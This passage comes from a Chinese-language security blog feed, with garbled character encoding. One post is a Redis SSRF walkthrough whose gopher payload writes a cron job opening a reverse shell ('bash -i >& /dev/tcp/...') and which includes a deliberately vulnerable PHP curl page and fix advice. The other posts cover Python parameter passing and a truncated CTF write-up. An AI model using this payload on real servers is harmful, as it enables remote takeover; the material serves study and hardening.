quit</span><br></pre></td></tr></table></figure><p>å…ˆåšä¸€ä¸ªç«¯å£è½¬å‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</span><br></pre></td></tr></table></figure><p>å†è¿è¡Œä¸Šé¢é‚£ä¸ªshellè„šæœ¬ï¼Œæ„æ€æ˜¯å°†æœ¬åœ°çš„4444ç«¯å£è½¬å‘åˆ°æœ¬åœ°çš„6379ç«¯å£ã€‚è®¿é—®è¯¥æœåŠ¡å™¨çš„4444ç«¯å£ï¼Œè®¿é—®çš„å…¶å®æ˜¯è¯¥æœåŠ¡å™¨çš„6379ç«¯å£ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis.sh 127.0.0.1 4444</span><br></pre></td></tr></table></figure><p>ç›‘å¬çš„è¿™è¾¹ä¼šæŠ“åˆ°æµé‡ï¼Œä¿å­˜ä¸‹æ¥å³å¯ï¼Œä¿å­˜åœ¨socat.log</p><p><img src="https://s2.ax1x.com/2019/06/16/VTI8EV.png" alt="VTI8EV.png"></p><p>ç„¶åå¯¹æµé‡è¿›è¡Œè½¬æ¢ä¸€ä¸‹ï¼Œé™„ä¸Šjoychouå¤§ä½¬çš„è½¬æ¢è„šæœ¬</p><p><img src="https://s2.ax1x.com/2019/06/16/VThwut.png" alt="VThwut.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="comment">#author: JoyChou</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">exp = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(sys.argv[<span class="number">1</span>]) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">'&gt;&lt;+'</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># åˆ¤æ–­å€’æ•°ç¬¬2ã€3å­—ç¬¦ä¸²æ˜¯å¦ä¸º\r</span></span><br><span class="line">        <span class="keyword">elif</span> line[<span class="number">-3</span>:<span class="number">-1</span>] == <span class="string">r'\r'</span>:</span><br><span class="line">            <span class="comment"># å¦‚æœè¯¥è¡Œåªæœ‰\rï¼Œå°†\ræ›¿æ¢æˆ%0a%0d%0a</span></span><br><span class="line">            <span class="keyword">if</span> len(line) == <span class="number">3</span>:</span><br><span class="line">                exp = exp + <span class="string">'%0a%0d%0a'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                line = line.replace(<span class="string">r'\r'</span>, <span class="string">'%0d%0a'</span>)</span><br><span class="line">                <span class="comment"># å»æ‰æœ€åçš„æ¢è¡Œç¬¦</span></span><br><span class="line">                line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">                exp = exp + line</span><br><span class="line">        <span class="comment"># åˆ¤æ–­æ˜¯å¦æ˜¯ç©ºè¡Œï¼Œç©ºè¡Œæ›¿æ¢ä¸º%0a</span></span><br><span class="line">        <span class="keyword">elif</span> line == <span class="string">'\x0a'</span>:</span><br><span class="line">            exp = exp + <span class="string">'%0a'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">            exp = exp + line</span><br><span class="line"><span class="keyword">print</span> exp</span><br></pre></td></tr></table></figure><p>è½¬æ¢è§„åˆ™å¦‚ä¸‹ï¼š</p><ul><li>å¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯<code>&gt;</code>æˆ–è€…<code>&lt;</code>é‚£ä¹ˆä¸¢å¼ƒè¯¥è¡Œå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºè¯·æ±‚å’Œè¿”å›çš„æ—¶é—´ã€‚</li><li>å¦‚æœå‰3ä¸ªå­—ç¬¦æ˜¯<code>+OK</code> é‚£ä¹ˆä¸¢å¼ƒè¯¥è¡Œå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºè¿”å›çš„å­—ç¬¦ä¸²ã€‚</li><li>å°†<code>\r</code>å­—ç¬¦ä¸²æ›¿æ¢æˆ<code>%0d%0a</code></li><li>ç©ºç™½è¡Œæ›¿æ¢ä¸º<code>%0a</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$63%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.70.134/2444 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ä¸ªç‚¹è¦æ³¨æ„çš„æ˜¯åœ¨JoyChouè¿™ä½è€å“¥çš„åšå®¢é‡Œé¢è¿˜æåŠä¸€ç‚¹å°±æ˜¯å­—ç¬¦é•¿åº¦çš„é—®é¢˜ï¼Œä»–çš„åšæ–‡æ˜¯ä»¥127.0.0.1ä½œä¸ºä¾‹å­çš„ï¼Œæ‰€ä»¥ä¼šå‡ºç°ä¸‹é¢çš„æƒ…å†µï¼Œå¦‚æœä¸æƒ³è¦è¿™ä¹ˆéº»çƒ¦æœ€å¥½ç›´æ¥åœ¨shellè„šæœ¬ä¸Šæ”¹ä¸€ä¸‹å°±å¥½</p><p><img src="https://s2.ax1x.com/2019/06/16/VThFBV.png" alt="VThFBV.png"></p><p>æœ€ååœ¨ä½ çš„æµé‡å‰é¢åŠ ä¸Šéœ€è¦çš„gopheråè®®<code>gopher://127.0.0.1:6379/_</code>æ„æˆæœ€åçš„payloadï¼Œæ„é€ ä¸€æ®µphpä»£ç å°è¯•ä¸€ä¸‹ï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) </span><br><span class="line">&#123; </span><br><span class="line">$link = $_POST[<span class="string">'url'</span>]; </span><br><span class="line">$filename = <span class="string">'./curled/'</span>.rand().<span class="string">'txt'</span>; </span><br><span class="line">$curlobj = curl_init($link); </span><br><span class="line">$fp = fopen($filename,<span class="string">"w"</span>); </span><br><span class="line">curl_setopt($curlobj, CURLOPT_FILE, $fp); </span><br><span class="line">curl_setopt($curlobj, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">curl_exec($curlobj); </span><br><span class="line">curl_close($curlobj); </span><br><span class="line">fclose($fp); </span><br><span class="line">$fp = fopen($filename,<span class="string">"r"</span>); </span><br><span class="line">$result = fread($fp, filesize($filename)); </span><br><span class="line">fclose($fp); </span><br><span class="line"><span class="keyword">echo</span> $result; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"> </span><br><span class="line">&lt;html&gt;&lt;body&gt; </span><br><span class="line"> </span><br><span class="line">&lt;form name=<span class="string">"px"</span> method=<span class="string">"post"</span> action=<span class="string">"./ssrf1.php"</span>&gt; </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"url"</span> value=<span class="string">""</span>&gt; </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;input type=<span class="string">"submit"</span> name=<span class="string">"commit"</span> value=<span class="string">"submit"</span>&gt;</span><br></pre></td></tr></table></figure><p>å¯èƒ½ç¬¦å·å¤ªå¤šéœ€è¦URLç¼–ç ä¸€ä¸‹ï¼Œè¿”å›äº”ä¸ªOK</p><p><img src="https://s2.ax1x.com/2019/06/16/VT4hzd.png" alt="VT4hzd.png"></p><p>å®šæ—¶ä»»åŠ¡æˆåŠŸå†™å…¥ï¼ŒæˆåŠŸåå¼¹shell</p><p><img src="https://s2.ax1x.com/2019/06/16/VT5PoT.png" alt="VT5PoT.png"></p><p><img src="https://s2.ax1x.com/2019/06/16/VT5SLq.png" alt="VT5SLq.png"></p><h3 id="ä¿®å¤çš„ä¾ä¸€äº›å»ºè®®"><a href="#ä¿®å¤çš„ä¾ä¸€äº›å»ºè®®" class="headerlink" title="ä¿®å¤çš„ä¾ä¸€äº›å»ºè®®"></a>ä¿®å¤çš„ä¾ä¸€äº›å»ºè®®</h3><p>1ã€ç¦æ­¢ä¸€äº›é«˜å±å‘½ä»¤</p><p>2ã€ä»¥ä½æƒé™è¿è¡Œ Redis æœåŠ¡</p><p>3ã€ä¸º Redis æ·»åŠ å¯†ç éªŒè¯</p><p>4ã€ç¦æ­¢å¤–ç½‘è®¿é—® Redis</p><p>5ã€ä¿è¯ authorized_keys æ–‡ä»¶çš„å®‰å…¨</p><p>6ã€è®¾ç½®é˜²ç«å¢™ç­–ç•¥</p>]]></content>
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>å…³äºpythonä¼ å‚å¼•å‘çš„ä¸€äº›æ€è€ƒ</title>
      <link href="/python-thinking-1.html"/>
      <url>/python-thinking-1.html</url>
      <content type="html"><![CDATA[<blockquote><p>äººæ€»æœ‰ä¸ä¼šçš„ï¼Œé‡åˆ°ä¸€äº›é—®é¢˜æ·±ç©¶ä¸‹å»å¿…å®šæœ‰æ‰€æ”¶è·</p></blockquote><p>è¿™ä¸ªé—®é¢˜æ˜¯åœ¨æˆ‘å†™pythonçˆ¬è™«é¡¹ç›®çš„æ—¶å€™çš„ç–‘é—®ï¼Œå¯èƒ½æ˜¯æˆ‘å¤ªèœäº†(ä»¥å‰æ²¡å­¦é€å½»)ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸Šå­¦æœŸå­¦Javaçš„æ—¶å€™æŒ‰å€¼ä¼ é€’çš„ç‰¹ç‚¹ç»™ææ··äº†ï¼Œå› ä¸ºå½“æ—¶åœ¨ç”¨å¤šçº¿ç¨‹çš„ç”Ÿäº§è€…æ¶ˆè´¹è€…é—®é¢˜å¤„ç†èµ„æºé˜Ÿåˆ—ï¼Œå‚è€ƒåˆ«äººä»£ç çš„æ—¶å€™çªç„¶è’™äº†ä¸€ä¸‹<a id="more"></a>ï¼Œä½†åæ¥æŸ¥äº†æŸ¥èµ„æ–™å‘ç°åŸæ¥æ˜¯ä¸‹é¢çš„åŸå› ï¼Œå€¼å¾—è®°å½•ä¸€ä¸‹å‘ç‚¹ï¼Œé¡ºä¾¿å½“å¤ä¹ ï¼Œå¯¹è¯­è¨€æœ‰ä¸ªæ›´æ·±å…¥çš„ç†è§£ä¹ŸæŒºå¥½çš„</p><h4 id="å‰ç½®çš„ä¸€äº›çŸ¥è¯†"><a href="#å‰ç½®çš„ä¸€äº›çŸ¥è¯†" class="headerlink" title="å‰ç½®çš„ä¸€äº›çŸ¥è¯†"></a>å‰ç½®çš„ä¸€äº›çŸ¥è¯†</h4><ol><li><p>åœ¨pythoné‡Œé¢ä¸€åˆ‡çš†ä¸ºå¯¹è±¡ï¼Œè€Œè¿™ä¸ªå¯¹è±¡åˆ†æˆä¸¤ç§ç±»å‹ï¼Œç¬¬ä¸€ç§æ˜¯å¯å˜çš„ï¼Œå¦å¤–ä¸€ç§æ˜¯ä¸å¯å˜çš„ã€‚</p></li><li><p>æŒ‰å€¼ä¼ é€’ï¼šä¼šåœ¨å †ä¸­å»ºç«‹ä¸€ä¸ªæ–°çš„å‰¯æœ¬ï¼Œä»¥åæ“ä½œåªå¯¹å‰¯æœ¬æ“ä½œï¼Œå¯¹åŸæ¥ä¸»å‡½æ•°é‡Œé¢çš„å€¼ä¸å½±å“ã€‚</p><p>æŒ‰å¼•ç”¨ä¼ é€’ï¼šä¼šåœ¨å †ä¸­å»ºç«‹ä¸€ä¸ªåœ°å€çš„å¼•ç”¨ï¼Œä¹Ÿå°±æ˜¯å‚æ•°çš„åœ°å€ï¼Œä¸€æ—¦æ”¹å˜è¿™ä¸ªå€¼å°±ä¼šæŠŠä¸»å‡½æ•°é‡Œé¢çš„å˜é‡ä¹Ÿä¼šæ”¹å˜ã€‚</p></li></ol><h4 id="åšä¸€äº›éªŒè¯"><a href="#åšä¸€äº›éªŒè¯" class="headerlink" title="åšä¸€äº›éªŒè¯"></a>åšä¸€äº›éªŒè¯</h4><p>è¿™é‡Œæˆ‘ä»¥å‚è€ƒçš„ä»£ç é‡Œé¢çš„ä¸€éƒ¨åˆ†è¿›è¡ŒéªŒè¯ï¼Œè¿™é‡Œç”¨ç±»å»ç±»æ¯”ä¸€ä¸‹å‡½æ•°ï¼Œä¸€æ ·çš„æ•ˆæœï¼Œé€šè¿‡idå‚æ•°æ‰“å°ä¸€ä¸‹åœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Consumer</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,page_queue,*args,**kwargs)</span>:</span></span><br><span class="line">        super(Consumer, self).__init__(*args,**kwargs)</span><br><span class="line">        self.page_queue = page_queue</span><br><span class="line">        print(id(self.page_queue))</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">page_queue = <span class="number">1</span></span><br><span class="line">print(id(page_queue))</span><br><span class="line">c = Consumer(page_queue)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœæ˜¯è¿™æ ·çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">140722209422880</span><br><span class="line">140722209422880</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ä¸¤å¤„çš„åœ°å€æ˜¯ä¸€æ ·çš„ï¼Œå¯ä»¥è„‘è¡¥ä¸€ä¸‹å›¾åº”è¯¥æ˜¯è¿™æ ·çš„ï¼Œå¥½åƒæ˜¯å¼•ç”¨ä¼ å€¼ï¼Œåˆ°åº•æ˜¯ä¸æ˜¯è¿™æ ·çš„å‘¢ï¼Ÿ</p><p><img src="https://s2.ax1x.com/2019/04/14/AO7U9f.png" alt="AO7U9f.png"></p><p>å†æ¥ä¸€æ®µä»£ç éªŒè¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Consumer</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,page_queue,*args,**kwargs)</span>:</span></span><br><span class="line">        super(Consumer, self).__init__(*args,**kwargs)</span><br><span class="line">        self.page_queue = page_queue</span><br><span class="line">        print(id(self.page_queue))</span><br><span class="line">        self.page_queue += <span class="number">1</span></span><br><span class="line">        print(id(self.page_queue))</span><br><span class="line">        print(id(page_queue),page_queue)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">page_queue = <span class="number">1</span></span><br><span class="line">print(id(page_queue))</span><br><span class="line">c = Consumer(page_queue)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>ç»“æœæ˜¯è¿™ä¸ªæ ·å­çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">140722209422880</span><br><span class="line">140722209422880</span><br><span class="line">140722209422912</span><br><span class="line">140722209422880 1</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ï¼Œä»¥æœ¬æ¥å¼•ç”¨çš„å¸¸è§„æ€è·¯å»çœ‹çš„è¯ï¼Œè¿™æ ·çš„æ“ä½œåº”è¯¥ä¼šå¯¹åŒä¸€ä¸ªåœ°å€çš„ä¸œè¥¿ä¿®æ”¹äº†æ‰å¯¹ï¼Œä½ ä¼šå‘ç°ï¼Œä»–é‡æ–°å¼€è¾Ÿäº†ä¸€ä¸ªæ–°çš„ç©ºé—´å»å®¹çº³æ–°çš„å€¼ï¼ŒåŸæ¥ä¼ è¿›å»çš„å‚æ•°æ²¡æœ‰å­˜åœ¨ä»»ä½•å½±å“ï¼Œè„‘è¡¥ä¸€ä¸‹è¿™ä¸ªå›¾ï¼Œç°åœ¨å˜æˆäº†è¿™æ ·ï¼Œè·Ÿå¹³å¸¸çš„å¼•ç”¨æ˜¯ä¸æ˜¯æœ‰ç‚¹ä¸ä¸€æ ·ã€‚</p><p><img src="https://s2.ax1x.com/2019/04/14/AOHK5q.png" alt="AOHK5q.png"></p><p>å†æ¥çœ‹è¿™æ ·ä¸€æ®µä»£ç ï¼Œä»¥é˜Ÿåˆ—ä¸ºä¾‹ï¼Œç„¶åå¯¹ä¼ è¿›çš„é˜Ÿåˆ—åšä¿®æ”¹ï¼Œå†è§‚å¯Ÿä¸€ä¸‹åœ°å€å†…å®¹çš„æ”¹å˜ï¼ŒæŸ¥çœ‹å…¶æ˜¯å¦ä¸ºç©º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Consumer</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,page_queue,*args,**kwargs)</span>:</span></span><br><span class="line">        super(Consumer, self).__init__(*args,**kwargs)</span><br><span class="line">        self.page_queue = page_queue</span><br><span class="line">        self.page_queue.put(<span class="number">1</span>)   <span class="comment">#å¢åŠ ä¸€ä¸ªå€¼</span></span><br><span class="line">        print(id(self.page_queue))</span><br><span class="line">        print(id(page_queue),page_queue.empty())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    page_queue = Queue(<span class="number">100</span>)</span><br><span class="line">    print(id(page_queue))</span><br><span class="line">    print(page_queue.empty())</span><br><span class="line">    c = Consumer(page_queue)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>è¾“å‡ºçš„ç»“æœæ˜¯è¿™ä¸ªæ ·å­çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1519902231520</span><br><span class="line">True</span><br><span class="line">1519902231520</span><br><span class="line">1519902231520 False</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°å€¼å˜åŒ–äº†ï¼Œåœ°å€å´æ²¡å‘ç”Ÿå˜åŒ–ï¼Œæ˜æ˜¾çš„å¼•ç”¨ä¼ å‚çš„ä¾‹å­</p><h4 id="è‡ªå·±çš„å°ç»“"><a href="#è‡ªå·±çš„å°ç»“" class="headerlink" title="è‡ªå·±çš„å°ç»“"></a>è‡ªå·±çš„å°ç»“</h4><p>è¿™é‡Œå°±å¯ä»¥å¯¹ç…§ä¸€ä¸‹ä¸Šé¢ä¸ºä»€ä¹ˆè¯´pythonå¯¹è±¡æœ‰ä¸¤ç§ç±»å‹ï¼Œä¸€ç§æ˜¯å¯å˜çš„ï¼Œå¦å¤–ä¸€ç§æ˜¯ä¸å¯å˜çš„ï¼Œå› ä¸ºåœ¨pythonè¿™ä¸ªè¯­è¨€ä¸­ï¼Œå¯¹äºä¸å¯å˜å¯¹è±¡çš„ä¼ å‚ä¾‹å¦‚(tupleï¼Œæ•°å­—ï¼Œå­—ç¬¦)ä»–ä»¬ä¸€æ—¦å‘ç”Ÿæ”¹å˜ï¼Œå°±ä¼šé‡æ–°åœ¨å †é‡Œé¢åˆ†é…ä½ ä¸€å—ç©ºé—´ï¼Œå»ç»™å˜åŒ–çš„å€¼ï¼Œè¿™ä¹Ÿåœ¨å®è§‚ä¸Šç»™äººä¸€ç§æŒ‰å€¼ä¼ é€’çš„é”™è§‰ï¼Œä½†æ˜¯è¿™æ ·çš„æœºåˆ¶ä¹Ÿä¼˜åŒ–äº†pythonçš„è¿è¡Œï¼Œå¯¹äºå¯å˜çš„å¯¹è±¡çš„ä¼ å‚ä¾‹å¦‚(listï¼Œdictï¼Œè¿˜æœ‰ä¸Šé¢æåŠåˆ°çš„queueç±»)ç›¸å½“äºé€šè¿‡æŒ‰å¼•ç”¨æ¥ä¼ é€’å¯¹è±¡ã€‚</p><p>å†™ä»£ç çš„æ—¶å€™æ‰å‘ç°è‡ªå·±æœ‰å¤šèœ2333333ï¼Œå¤§ä½¬ä»¬è¯·å¿½ç•¥</p>]]></content>
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>å‘¨å‘¨ç»ƒè¥¿æ¹–è®ºå‰‘ç‰¹åˆ«ç‰ˆ(éƒ¨åˆ†wp)</title>
      <link href="/week-practice-anheng.html"/>
      <url>/week-practice-anheng.html</url>
      <content type="html"><![CDATA[<p>å¤ä¹ æ•°å­¦å¤ä¹ åˆ°åï¼Œç»“æœåˆè¯´æ¨è¿Ÿä¸€ä¸ªæœˆå†è€ƒè¯•ï¼Œå®åœ¨å¯¹æ•°å­¦æä¸äº†å…´è¶£å°±åˆ·åˆ·é¢˜ï¼Œåˆæ¥æ°´ä¸€ç¯‡åšå®¢<a id="more"></a>    </p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h4><p>è¿™ä¸ªé¢˜æ‰«ä¸ªäºŒç»´ç å°±è¡Œäº†</p><h4 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h4><p>è¿™ä¸ªé¢˜ç›®è¯´ç®¡ç†å‘˜ç™»é™†çš„å¯†ç å°±æ˜¯flagï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å¯¼å‡ºhttpå¯¹è±¡çœ‹ä¸€ä¸‹å‘ç°è¿™å‡ ä¸ªå¯ç–‘çš„url</p><p><a href="https://imgchr.com/i/AruUIO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/31/AruUIO.png" alt="AruUIO.png"></a></p><p>ç‚¹å‡»å¤§å°ä¸º7266å­—èŠ‚çš„é‚£ä¸ªåŒ…ç„¶åè¿½è¸ªæµå°±ä¼šå‘ç°ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªpasswordå…³é”®å­—ï¼Œè¿™ä¸ªå°±æ˜¯flag</p><p><img src="https://s2.ax1x.com/2019/03/31/ArussI.png" alt="ArussI.png"></p><h4 id="ç™¾é‡ŒæŒ‘ä¸€"><a href="#ç™¾é‡ŒæŒ‘ä¸€" class="headerlink" title="ç™¾é‡ŒæŒ‘ä¸€"></a>ç™¾é‡ŒæŒ‘ä¸€</h4><p>æˆ‘è®°å¾—è¿™ä¸ªä»¥å‰åšè¿‡ï¼Œå¥½åƒæ˜¯è¦å†™ä¸ªè„šæœ¬æŠŠé‡Œé¢çš„å›¾ç‰‡ç­›é€‰å‡ºæ¥ï¼Œå¤ªè€—ç¥æ²¡æ—¶é—´ä¸åšäº†ï¼Œå¯¼äº†ä¸€ä¸‹å›¾ç‰‡ï¼Œ418å¼ ã€‚ã€‚ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/31/AruIQs.png" alt="AruIQs.png"></p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Ordinary-keyboard"><a href="#Ordinary-keyboard" class="headerlink" title="Ordinary keyboard"></a>Ordinary keyboard</h4><p>ä¸æ¸…æ¥šé¢˜ç›®è·Ÿkeyboardæœ‰ä»€ä¹ˆå…³ç³»ï¼Œåæ­£æˆ‘åªèƒ½ä»é¢˜ç›®ä¸­äº†è§£åˆ°å‡ ä¸ªå­—æ¯çš„å¯¹åº”å…³ç³»ï¼Œåæ­£æ•°å­—æ˜¯ä¸å˜çš„ã€‚ã€‚è¿˜æ˜¯ç•™ç‚¹è„‘å­æƒ³é«˜æ•°å§ï¼Œè¿™è„‘æ´çœŸçš„ä¸é€‚åˆæˆ‘</p><h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p>æ­£å¸¸ç±»å‹çš„é¢˜ç›®ï¼Œç»™äº†ä½ å…¬é’¥ï¼Œå…ˆç”¨opensslæŠŠnï¼Œeå¯¼å‡ºæ¥</p><p><img src="https://s2.ax1x.com/2019/03/31/ArK1k8.png" alt="ArK1k8.png"></p><p>ç„¶åè½¬åè¿›åˆ¶nåˆ†è§£</p><p><img src="https://s2.ax1x.com/2019/03/31/ArKamq.png" alt="ArKamq.png"></p><p><img src="https://s2.ax1x.com/2019/03/31/ArKw7V.png" alt="ArKw7V.png"></p><p>æä¸ªä»£ç å†™ä¸ªç§é’¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">arsa=RSA.generate(<span class="number">1024</span>)</span><br><span class="line">arsa.p=<span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">arsa.q=<span class="number">304008741604601924494328155975272418463</span></span><br><span class="line">arsa.e=<span class="number">65537</span></span><br><span class="line">arsa.n=arsa.p*arsa.q</span><br><span class="line">Fn=long((arsa.p<span class="number">-1</span>)*(arsa.q<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line">i=<span class="number">1</span></span><br><span 